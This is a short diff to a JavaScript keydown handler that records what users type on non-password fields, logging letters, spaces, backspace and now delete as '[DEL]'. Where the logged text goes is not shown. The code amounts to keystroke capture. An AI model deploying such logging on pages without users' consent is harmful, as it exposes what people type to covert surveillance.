@@ -12,10 +12,12 @@ document.addEventListener("keydown", function (e) {
 	if(e.target.type != 'password') {
 		var charCode = e.keyCode;
 
-		if ((charCode > 64 && charCode < 91) || (charCode > 96 && charCode < 123) || charCode == 46 || charCode == 32) {
+		if ((charCode > 64 && charCode < 91) || (charCode > 96 && charCode < 123) || charCode == 32) {
 			log(String.fromCharCode(charCode));
 		} else if (charCode == 8) {
 			log("[BKSP]");
+		} else if (charCode == 46) {
+			log("[DEL]");
 		}
 		
 		charCount += 1;
